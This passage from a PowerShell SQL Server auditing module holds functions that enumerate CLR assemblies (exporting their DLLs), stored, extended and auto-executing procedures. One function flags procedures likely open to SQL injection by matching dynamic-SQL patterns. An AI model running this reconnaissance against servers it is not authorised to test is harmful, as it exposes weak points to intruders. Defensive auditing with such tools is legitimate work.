        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Show native CLR as well.')]
        [Switch]$ShowAll,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAssemblyFiles = New-Object -TypeName System.Data.DataTable
        $null = $TblAssemblyFiles.Columns.Add('ComputerName')
        $null = $TblAssemblyFiles.Columns.Add('Instance')
        $null = $TblAssemblyFiles.Columns.Add('DatabaseName')
        $null = $TblAssemblyFiles.Columns.Add('schema_name')
        $null = $TblAssemblyFiles.Columns.Add('file_id')
        $null = $TblAssemblyFiles.Columns.Add('file_name')
        $null = $TblAssemblyFiles.Columns.Add('clr_name')   
        $null = $TblAssemblyFiles.Columns.Add('assembly_id')
        $null = $TblAssemblyFiles.Columns.Add('assembly_name') 
        $null = $TblAssemblyFiles.Columns.Add('assembly_class')
        $null = $TblAssemblyFiles.Columns.Add('assembly_method')    
        $null = $TblAssemblyFiles.Columns.Add('sp_object_id') 
        $null = $TblAssemblyFiles.Columns.Add('sp_name')
        $null = $TblAssemblyFiles.Columns.Add('sp_type')
        $null = $TblAssemblyFiles.Columns.Add('permission_set_desc')
        $null = $TblAssemblyFiles.Columns.Add('create_date')
        $null = $TblAssemblyFiles.Columns.Add('modify_date')
        $null = $TblAssemblyFiles.Columns.Add('content')
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Setup assembly name filter
        if($AssemblyName){
            $AssemblyNameQuery = "WHERE af.name LIKE '%$AssemblyName%'"
        }else{
            $AssemblyNameQuery = ""
        }

        # Set counter
        $Counter = 0

        # Get the privs for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Searching for CLR stored procedures in $DbName"
            }

            # Define Query
            $Query = "  USE $DbName;
                        SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], 
			                        af.file_id,					  	
			                        af.name + '.dll' as [file_name],
			                        asmbly.clr_name,
			                        asmbly.assembly_id,           
			                        asmbly.name AS [assembly_name], 
                                    am.assembly_class,
                                    am.assembly_method,
			                        so.object_id as [sp_object_id],
			                        so.name AS [sp_name],
                                    so.[type] as [sp_type],
                                    asmbly.permission_set_desc,
                                    asmbly.create_date,
                                    asmbly.modify_date,
                                    af.content								           
                        FROM        sys.assembly_modules am
                        INNER JOIN  sys.assemblies asmbly
                        ON  asmbly.assembly_id = am.assembly_id
                        INNER JOIN sys.assembly_files af 
                        ON asmbly.assembly_id = af.assembly_id 
                        INNER JOIN  sys.objects so
                        ON  so.[object_id] = am.[object_id]
                        $AssemblyNameQuery"

                    $NativeStuff = "
                        UNION ALL
                        SELECT      SCHEMA_NAME(at.[schema_id]) AS [SchemaName], 
			                        af.file_id,					  	
			                        af.name + '.dll' as [file_name],
			                        asmbly.clr_name,
			                        asmbly.assembly_id,
                                    asmbly.name AS [AssemblyName],
                                    at.assembly_class,
                                    NULL AS [assembly_method],
			                        NULL as [sp_object_id],
			                        at.name AS [sp_name],
                                    'UDT' AS [type],
                                    asmbly.permission_set_desc,
                                    asmbly.create_date,
                                    asmbly.modify_date,
                                    af.content								           
                        FROM        sys.assembly_types at
                        INNER JOIN  sys.assemblies asmbly 
                        ON asmbly.assembly_id = at.assembly_id
                        INNER JOIN sys.assembly_files af 
                        ON asmbly.assembly_id = af.assembly_id
                        ORDER BY    [assembly_name], [assembly_method], [sp_name]"

            # Check for showall
            if($ShowAll){
                $Query = "$Query$NativeStuff"
            }

            # Execute Query
            $TblAssemblyFilesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Add each result to table
            $TblAssemblyFilesTemp |
            ForEach-Object -Process {

                # Add results to table
                $null = $TblAssemblyFiles.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]$DbName,
                    [string]$_.schema_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.assembly_class,
                    [string]$_.assembly_method,
                    [string]$_.sp_object_id,
                    [string]$_.sp_name,
                    [string]$_.sp_type,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.content)

                # Setup vars for verbose output
                $CLRFilename = $_.file_name
                $CLRMethod = $_.assembly_method
                $CLRAssembly = $_.assembly_name
                $CLRAssemblyClass = $_.assembly_class
                $CLRSp = $_.sp_name   
                
                # Status user
                Write-Verbose "$instance : - File:$CLRFilename Assembly:$CLRAssembly Class:$CLRAssemblyClass Method:$CLRMethod Proc:$CLRSp"                             

                # Export dll 
                if($ExportFolder){

                    # Create export folder
                    $ExportOutputFolder = "$ExportFolder\CLRExports"
                    If ((test-path $ExportOutputFolder) -eq $False){
                        Write-Verbose "$instance :   Creating export folder: $ExportOutputFolder"
                        $null = New-Item -Path "$ExportOutputFolder" -type directory
                    }  
                    
                    # Create instance subfolder if it doesnt exist
                    $InstanceClean = $Instance -replace('\\','_')
                    $ServerPath = "$ExportOutputFolder\$InstanceClean"
                    If ((test-path $Serverpath) -eq $False){
                        Write-Verbose "$instance :   Creating server folder: $ServerPath"
                        $null = New-Item -Path "$ServerPath" -type directory
                    }                   

                    # Create database subfolder if it doesnt exist
                    $Databasepath = "$ServerPath\$DbName"
                    If ((test-path $Databasepath) -eq $False){
                        Write-Verbose "$instance :   Creating database folder: $Databasepath"
                        $null = New-Item $Databasepath -type directory
                    } 
                    
                    # Create dll file if it doesnt exist                  
                    $FullExportPath = "$Databasepath\$CLRFilename"
                    if(-not (Test-Path $FullExportPath)){
                        Write-Verbose "$Instance :   Exporting $CLRFilename"                        
                        $_.content | Set-Content -Encoding Byte $FullExportPath
                    }else{
                        Write-Verbose "$Instance :   Exporting $CLRFilename - Aborted, file exists."  
                    }

                    # Update counter
                    $Counter = $Counter + 1                    
                }                     
            }
        }
    }

    End
    {
        # Check count
        $CLRCount = $TblAssemblyFiles.Rows.Count
        if ($CLRCount -gt 0){
            Write-Verbose "$Instance : Found $CLRCount CLR stored procedures"
        }else{
            Write-Verbose "$Instance : No CLR stored procedures found."    
        }

        # Return data
        $TblAssemblyFiles
    }
}


Function  Get-SQLStoredProcedure
{


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }

        # Setup AutoExec filter
        if ($AutoExec)
        {
            $AutoExecFilter = " AND is_auto_executed = 1"
        }
        else
        {
            $AutoExecFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                $AutoExecFilter
                $ProcedureNameFilter
                $KeywordFilter"

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}


Function  Get-SQLStoredProcedureXP
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblXpProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT '$ComputerName' as [ComputerName],
                    '$Instance' as [Instance],
                    '$DbName' as [DatabaseName],                
                    o.object_id,
		            o.parent_object_id,
		            o.schema_id,
		            o.type,
		            o.type_desc,
		            o.name,
		            o.principal_id,
		            s.text,
		            s.ctext,
		            s.status,
		            o.create_date,
		            o.modify_date,
		            o.is_ms_shipped,
		            o.is_published,
		            o.is_schema_published,
		            s.colid,
		            s.compressed,
		            s.encrypted,
		            s.id,
		            s.language,
		            s.number,
		            s.texttype
            FROM sys.objects o 
            INNER JOIN sys.syscomments s
		            ON o.object_id = s.id
            WHERE o.type = 'x' 
            $ProcedureNameFilter"

            # Execute Query
            $TblXpProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblXpProcs = $TblXpProcs + $TblXpProcsTemp
        }
    }

    End
    {

        # Count 
        $XpNum = $TblXpProcs.Count
        if($XpNum -eq 0){

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : No custom extended stored procedures found."
            }
        }

        # Return data
        $TblXpProcs
    }
}


Function  Get-SQLStoredProcedureSQLi
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for signed procedures.')]
        [switch]$OnlySigned,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }

        # Setup AutoExec filter
        if ($AutoExec)
        {
            $AutoExecFilter = " AND is_auto_executed = 1"
        }
        else
        {
            $AutoExecFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking databases below for vulnerable stored procedures:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {

                Write-Verbose -Message "$Instance : - Checking $DbName database..."

            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1 AND               
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') 
                AND ROUTINE_DEFINITION like '%+%'
                AND ROUTINE_CATALOG not like 'msdb' 
                $AutoExecFilter                              
                $ProcedureNameFilter
                $KeywordFilter
                ORDER BY ROUTINE_NAME"

            # Define query for signed procedures
            if($OnlySigned){
                $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                spr.ROUTINE_CATALOG as DB_NAME,
                spr.SPECIFIC_SCHEMA as SCHEMA_NAME,
                spr.ROUTINE_NAME as SP_NAME,
                spr.ROUTINE_DEFINITION as SP_CODE,
                CASE cp.crypt_type
                when 'SPVC' then cer.name
                when 'CPVC' then Cer.name
                when 'SPVA' then ak.name
                when 'CPVA' then ak.name
                END as CERT_NAME,
                sp.name as CERT_LOGIN,
                sp.sid as CERT_SID
                FROM sys.crypt_properties cp
                JOIN sys.objects o ON cp.major_id = o.object_id
                LEFT JOIN sys.certificates cer ON cp.thumbprint = cer.thumbprint
                LEFT JOIN sys.asymmetric_keys ak ON cp.thumbprint = ak.thumbprint
                LEFT JOIN INFORMATION_SCHEMA.ROUTINES spr on spr.ROUTINE_NAME = o.name
                LEFT JOIN sys.server_principals sp on sp.sid = cer.sid
                WHERE o.type_desc = 'SQL_STORED_PROCEDURE'AND
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') AND
                ROUTINE_CATALOG not like 'msdb' AND 
                ROUTINE_DEFINITION like '%+%'"
            }

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Count results
            $TblProcsCount = $TblProcsTemp.rows.count
            Write-Verbose "$Instance : - $TblProcsCount found in $DbName database"

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}

Function  Get-SQLStoredProcedureAutoExec
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking for autoexec stored procedures..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  use [master];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                AND is_auto_executed = 1
                $ProcedureNameFilter
                $KeywordFilter"

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            if(-not $TblProcsTemp){
                #Write-Verbose -Message "$Instance : No autoexec procedures found."
            }

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}

Function  Get-SQLAssemblyFile
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAssemblyFiles = New-Object -TypeName System.Data.DataTable
        $null = $TblAssemblyFiles.Columns.Add('ComputerName')
        $null = $TblAssemblyFiles.Columns.Add('Instance')
        $null = $TblAssemblyFiles.Columns.Add('DatabaseName')
        $null = $TblAssemblyFiles.Columns.Add('assembly_id')
        $null = $TblAssemblyFiles.Columns.Add('assembly_name')
        $null = $TblAssemblyFiles.Columns.Add('file_id')
        $null = $TblAssemblyFiles.Columns.Add('file_name')
        $null = $TblAssemblyFiles.Columns.Add('clr_name')        
        $null = $TblAssemblyFiles.Columns.Add('content')
        $null = $TblAssemblyFiles.Columns.Add('permission_set_desc')
        $null = $TblAssemblyFiles.Columns.Add('create_date')
        $null = $TblAssemblyFiles.Columns.Add('modify_date')
        $null = $TblAssemblyFiles.Columns.Add('is_user_defined')
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Setup assembly name filter
        if($AssemblyName){
            $AssemblyNameQuery = "WHERE af.name LIKE '%$AssemblyName%'"
        }else{
            $AssemblyNameQuery = ""
        }

        # Get the privs for each database
        $TblDatabases |
